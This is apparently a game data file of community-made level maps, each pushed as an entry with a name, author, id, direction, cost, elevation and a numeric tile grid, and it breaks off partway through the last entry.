maps.push({name="Invisible  Pillars",author="FL00D",id="#1668833370",direction="left",cost=217,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,199,199,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,25,25,25,199,199,25,0,0,0,199,199,0,0,25,25,25,0,0,0,25,25,25,25,25,25,25,25,25,0,199,199,25,25,25,25,25,0,0,0,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,0,0,0,0,25,25,199,199,0,0,0,25,25,25,25,25,25,25,25,0,0,0,0,0,25,25,199,199,0,0,0,199,199,0,0,199,199,0,0,0,0,0,0,0,25,25,25,0,0,0,0,199,199,0,0,199,199,0,0,199,199,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,199,199,0,0,0,0,25,25,25,25,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,25,25,25,25,25,25,25,25,25,0,0,0,0,0,199,199,0,0,0,199,199,25,25,25,25,25,25,25,25,25,0,0,0,0,199,199,0,0,0,199,199,0,0,0,0,0,0,199,199,25,25,0,0,0,0,0,0,0,0,0,0,199,199,0,0,0,0,199,199,25,25,0,2,25,25,25,25,25,25,25,25,199,199,0,0,0,0,0,0,25,25,0,2,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,0,0,0,0,0,0,0,0,0,0,25,25,25,25,25,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="72r3hg2fouiwebnf0w23",author="FL00D",id="#1668833683",direction="forward",cost=212,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,100,24,24,24,24,14,14,14,14,24,24,24,24,100,0,0,0,0,0,0,24,145,24,24,24,14,14,14,14,24,24,24,145,24,0,0,0,0,0,0,24,24,24,24,24,14,14,14,14,24,24,24,24,24,0,0,0,0,0,0,24,24,24,24,14,14,66,66,14,14,24,24,24,24,0,0,0,0,0,0,14,141,14,14,14,66,66,66,66,14,14,14,141,14,0,0,0,0,0,0,14,14,14,14,66,66,66,66,66,66,14,14,14,14,0,0,0,0,0,0,14,14,14,14,66,66,66,66,66,66,14,14,14,14,0,0,0,0,0,0,14,141,14,14,14,66,66,66,66,14,14,14,141,14,0,0,0,0,0,0,24,24,24,24,14,14,66,66,14,14,24,24,24,24,0,0,0,0,0,0,24,24,24,24,24,14,14,14,14,24,24,24,24,24,0,0,0,0,0,0,24,145,24,24,24,14,14,14,14,24,24,24,145,24,0,0,0,0,0,0,100,24,24,24,24,14,14,14,14,24,24,24,24,100,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger on Top 3",author="FL00D",id="#1668833836",direction="forward",cost=138,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,0,6,6,6,0,0,6,6,6,6,6,6,6,0,0,6,6,6,6,6,0,6,6,6,0,0,0,0,6,0,0,6,97,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,0,6,6,0,0,0,0,43,34,44,35,37,26,0,6,0,0,0,0,0,0,6,6,0,0,0,0,33,1,124,1,1,37,0,0,0,0,0,0,0,0,96,96,0,0,0,0,42,1,124,124,1,27,0,0,0,0,0,0,0,0,96,96,0,0,0,0,32,1,124,124,1,38,0,0,0,0,0,0,0,0,6,6,0,0,0,0,41,1,1,124,1,28,0,0,0,0,0,0,0,0,6,6,0,0,0,0,31,41,30,40,29,39,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,131,44,0,0,0,0,0,0,0,0,0,0,6,6,132,6,0,0,0,0,44,100,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Nice Bridge",author="FL00D",id="#1668837474",direction="left",cost=146,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,2,8,8,8,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,2,8,8,8,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,1,8,8,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,1,8,8,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,1,8,8,8,13,14,15,16,17,17,16,15,14,13,8,8,8,0,0,0,1,8,8,8,8,9,10,11,12,12,11,10,9,8,8,8,8,0,0,0,1,8,8,8,8,9,10,11,12,12,11,10,9,8,8,8,8,0,0,0,1,8,8,8,8,9,10,11,12,12,11,10,9,8,8,8,8,0,0,0,0,13,13,13,13,14,15,16,17,17,16,15,14,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="dw someone will trig",author="alli",id="#1668861989",direction="right",cost=239,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,2,2,114,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,114,114,114,114,0,0,66,66,0,0,0,0,0,128,34,0,0,0,0,114,114,114,114,114,0,0,66,66,0,0,0,0,0,34,34,0,0,0,0,94,114,114,114,94,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,90,114,114,114,90,0,0,66,66,0,0,0,0,0,34,34,0,0,0,0,114,114,114,114,114,114,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,114,114,114,114,114,0,66,66,0,0,0,0,0,14,14,14,14,14,14,14,114,114,114,114,114,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,114,114,114,114,114,0,66,66,0,0,0,0,0,1,115,1,0,0,0,0,90,114,114,114,90,0,0,0,0,0,0,0,0,1,115,1,0,0,0,0,114,114,114,114,114,0,66,66,0,0,0,0,0,1,115,1,1,1,1,1,114,114,114,114,114,0,0,0,0,0,0,0,0,1,116,116,116,116,116,116,1,88,114,114,88,0,66,66,0,0,0,0,0,0,1,1,1,1,1,117,1,114,114,114,114,0,0,0,0,0,0,0,0,1,118,118,118,118,118,118,1,114,114,114,2,0,30,30,0,0,0,5,5,1,119,1,1,1,1,1,1,114,114,114,2,30,93,10,30,0,0,5,131,1,120,120,120,1,0,0,1,114,114,114,114,30,10,93,30,0,0,5,5,1,1,1,121,1,0,0,1,114,132,114,1,0,30,30,0,0,0,100,5,65,65,122,122,1,0,0,0,1,1,1,0,0,0,0,0,0,0,5,5,1,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Boring",author="FL00D",id="#1668882891",direction="forward",cost=60,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,38,0,0,0,0,0,0,0,0,0]});
maps.push({name="Natural Selection",author="tilgep",id="#1668887970",direction="left",cost=172,elevation=0,map=[0,0,0,0,0,0,0,8,8,2,2,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,145,38,0,0,0,0,0,0,0,8,8,8,8,8,125,0,0,0,0,0,0,154,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,109,8,8,8,0,0,0,0,0,0,153,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,145,35,0,0,0,0,0,0,0,125,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,1,8,8,0,0,0,0,0,0,0,0,0,0,0,0,1,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,8,8,8,8,8,0,0,0,0,0,0,155,8,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,0,0,157,8,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,2,8,8,8,1,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,2,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,8,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,8,8,8,8,8,8,8,125,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="One Stop Shop",author="tilgep",id="#1668889926",direction="forward",cost=159,elevation=4,map=[0,0,0,0,0,6,2,2,6,0,0,0,0,0,0,0,0,0,0,0,0,199,199,199,199,6,6,6,6,0,0,0,0,0,0,0,0,0,8,8,6,6,96,6,6,6,6,6,6,0,0,0,0,0,0,0,0,125,8,93,6,146,96,0,0,0,0,0,0,0,0,0,0,0,0,187,11,0,8,8,160,6,186,0,187,5,173,170,0,0,0,0,0,0,0,0,174,0,8,94,160,6,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,160,6,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,93,158,6,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,6,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,187,12,175,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,30,30,30,30,30,30,0,0,0,0,0,0,0,9,9,0,0,0,0,0,30,97,30,30,30,30,0,0,0,0,0,0,0,10,10,0,0,0,0,0,30,30,30,30,30,30,0,0,0,0,0,0,0,10,85,0,0,0,0,0,110,110,110,110,30,0,0,0,0,0,0,0,0,10,10,0,0,0,0,110,110,96,96,110,110,0,0,0,0,0,0,0,0,10,10,10,10,10,110,110,96,110,110,96,110,0,0,0,0,0,0,0,0,10,10,10,10,10,110,96,0,2,2,0,96,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Monza Chicane",author="ZpLit",id="#1668891482",direction="forward",cost=121,elevation=0,map=[0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,14,14,14,0,0,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0]});
maps.push({name="RACE Senna S",author="ZpLit",id="#1668891778",direction="left",cost=148,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,2,2,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,6,6,6,7,7,7,0,0,0,0,0,10,10,10,10,0,0,0,1,6,6,6,6,7,7,7,7,0,0,0,10,10,10,10,10,0,0,5,5,6,6,6,6,7,7,7,7,0,0,0,10,10,10,10,10,0,5,5,5,6,6,6,6,7,7,7,7,0,0,0,10,10,10,10,10,5,5,5,5,6,6,6,1,0,7,7,7,0,0,0,10,10,10,10,0,2,5,5,5,6,0,0,0,0,7,7,7,0,0,1,10,10,10,1,0,2,5,5,1,0,0,0,0,1,7,7,7,1,0,0,9,9,9,0,0,5,5,5,0,0,0,0,0,0,8,8,8,8,1,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Locking it up",author="TF2 Pencil",id="#1668906917",direction="left",cost=340,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,10,10,0,0,0,0,0,0,0,0,0,1,116,116,116,116,195,16,14,12,10,10,0,0,0,0,0,0,0,0,0,1,94,94,94,116,195,16,14,12,10,10,0,2,10,10,10,12,16,20,20,1,94,94,94,116,195,16,14,12,10,10,0,2,10,10,10,12,16,20,97,1,94,94,94,116,195,16,14,12,10,10,0,0,0,10,10,1,20,20,20,1,116,116,116,116,195,16,14,12,10,10,0,0,0,10,10,199,20,20,20,1,1,1,116,1,1,0,0,0,10,10,0,0,0,10,10,1,82,84,82,1,36,36,36,0,0,0,10,10,10,10,0,0,0,10,10,1,82,20,82,1,131,36,36,0,0,0,10,132,10,10,0,0,0,10,10,1,84,82,82,1,1,1,1,1,1,1,1,1,10,10,0,0,0,10,10,1,20,84,84,84,84,84,84,84,84,84,76,20,10,10,0,0,0,10,10,1,82,81,20,82,81,20,82,81,20,84,76,20,3,10,0,0,0,10,10,1,84,84,84,84,84,84,84,84,84,84,76,20,10,10,0,0,0,10,10,1,1,1,1,1,1,1,1,1,1,1,1,1,10,10,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Longjumping",author="sivi",id="#1668957832",direction="forward",cost=248,elevation=0,map=[0,0,0,0,0,0,0,0,11,2,2,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,11,11,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,11,11,8,0,0,0,0,0,0,0,0,0,0,0,145,145,145,145,189,7,11,11,7,189,145,145,145,145,0,0,0,0,0,145,5,5,5,5,5,6,11,11,6,5,5,5,5,5,145,0,0,0,145,5,65,65,65,65,65,5,45,45,5,65,65,65,65,65,5,145,0,0,21,65,65,65,65,65,65,5,45,45,5,65,65,65,65,65,65,21,0,0,93,65,65,0,11,186,11,11,45,45,11,11,187,11,0,65,65,93,0,0,94,65,65,170,177,176,125,11,45,45,11,125,173,174,170,65,65,94,0,0,93,65,65,0,187,11,11,11,45,45,11,11,11,186,0,65,65,93,0,0,21,65,65,65,65,65,65,5,45,45,5,65,65,65,65,65,65,21,0,0,145,5,65,65,65,65,65,5,45,45,5,65,65,65,65,65,5,145,0,0,0,145,5,5,5,5,5,6,11,11,6,5,5,5,5,5,145,0,0,0,0,0,145,145,145,145,188,7,11,11,7,188,145,145,145,145,0,0,0,0,0,0,0,0,0,0,0,8,11,11,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,11,11,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,2,2,11,0,0,0,0,0,0,0,172]});
maps.push({name="RACE U turn",author="ZpLit",id="#1668978458",direction="right",cost=103,elevation=0,map=[0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,2,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,2,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Delfino Square",author="ZpLit",id="#1668979676",direction="forward",cost=166,elevation=-2,map=[0,0,0,0,0,0,0,0,0,0,0,0,16,2,2,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,14,14,16,0,0,0,0,0,0,0,0,0,0,15,15,15,16,16,16,14,14,14,16,0,0,0,0,0,0,0,0,0,15,13,13,13,14,14,14,14,14,14,16,0,0,0,0,0,0,0,0,15,13,13,13,13,14,14,14,14,14,14,16,0,0,0,0,0,0,0,15,13,13,13,15,15,16,16,16,16,14,14,16,0,0,0,0,0,0,15,13,13,13,15,0,0,0,0,0,16,14,14,16,0,0,0,0,0,0,15,13,13,15,0,0,0,0,0,0,15,13,13,15,0,0,0,0,0,0,15,13,13,15,0,0,0,0,0,0,15,13,13,15,0,0,0,0,0,0,15,13,13,15,0,0,0,0,0,0,15,13,13,15,0,0,0,0,0,0,14,12,12,14,14,14,15,15,15,15,13,13,13,15,0,0,0,0,0,0,14,12,12,12,12,12,13,13,13,13,13,13,13,15,0,0,0,0,0,0,14,12,12,12,12,12,13,13,13,13,13,13,13,15,0,0,0,0,0,0,14,12,12,12,14,14,15,15,15,15,15,15,15,0,0,0,0,0,0,0,14,12,12,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,12,12,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,12,12,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,12,12,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,12,12,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Airship Fortres",author="ZpLit",id="#1669008361",direction="right",cost=169,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,13,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,16,16,15,14,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,16,16,16,15,14,13,13,13,13,0,0,0,0,0,0,0,0,0,0,16,16,16,16,15,14,13,13,13,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,1,0,0,0,0,0,0,35,35,35,35,35,0,0,0,0,35,13,13,13,35,0,0,0,0,0,35,13,13,13,13,2,0,0,0,0,35,13,13,13,35,0,0,0,0,35,13,13,13,13,13,2,0,0,0,0,35,13,13,13,35,0,0,0,35,13,13,13,13,35,35,35,0,0,0,0,35,13,13,13,35,0,0,0,35,13,13,13,35,0,0,0,0,0,0,0,35,13,13,13,13,35,35,35,13,13,13,13,35,0,0,0,0,0,0,0,35,13,13,13,13,13,13,13,13,13,13,13,35,0,0,0,0,0,0,0,35,13,13,13,13,13,13,13,13,13,13,13,35,0,0,0,0,0,0,0,35,13,13,13,13,13,13,13,13,13,13,13,35,0,0,0,0,0,0,0,0,35,35,35,35,35,35,35,35,35,35,35,0,0,0,0]});
maps.push({name="Training Course",author="sivi",id="#1669067363",direction="forward",cost=265,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,114,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,1,1,14,14,14,0,0,12,145,0,14,0,0,12,145,0,114,114,114,114,1,1,14,90,14,0,0,152,0,0,14,0,0,152,0,0,114,114,90,114,1,1,14,14,14,0,0,14,145,0,14,0,0,14,145,0,114,114,114,114,1,1,127,127,127,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,114,114,114,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,114,90,114,1,1,0,0,0,0,0,0,0,0,153,0,0,0,0,0,199,114,114,114,1,1,0,0,0,0,0,0,0,157,14,145,0,0,0,0,199,114,114,114,1,1,0,0,0,0,0,0,0,0,154,0,0,0,0,0,199,114,114,114,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,114,90,114,1,1,173,168,174,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,95,1,1,3,3,3,0,0,0,0,24,0,0,1,119,119,119,1,14,14,14,1,1,16,16,16,16,129,0,0,148,0,0,119,93,93,93,119,14,14,14,1,1,16,90,16,16,129,0,0,0,0,0,119,93,93,93,119,14,90,14,1,1,16,16,16,16,129,0,0,148,0,0,119,93,93,93,119,14,14,14,1,1,0,0,0,0,0,0,0,24,0,0,1,119,119,119,1,14,9998,9998,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,114,2,2,1]});
maps.push({name="gradual curve down",author="chinny",id="#1669067911",direction="right",cost=117,elevation=-17,map=[24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,24,24,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,18,18,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,17,17,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,16,16,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,16,16,15,15,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,15,15,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,14,14,14,13,12,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,13,13,12,11,10,10,9,0,0,0,0,0,0,0,0,0,0,0,0,13,13,12,12,12,11,10,9,8,7,6,5,0,0,0,0,0,0,0,0,0,0,12,11,11,11,10,9,9,8,7,2,0,0,0,0,0,0,0,0,0,0,0,0,10,10,9,9,9,8,7,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,7,6,5]});
maps.push({name="gradual curve 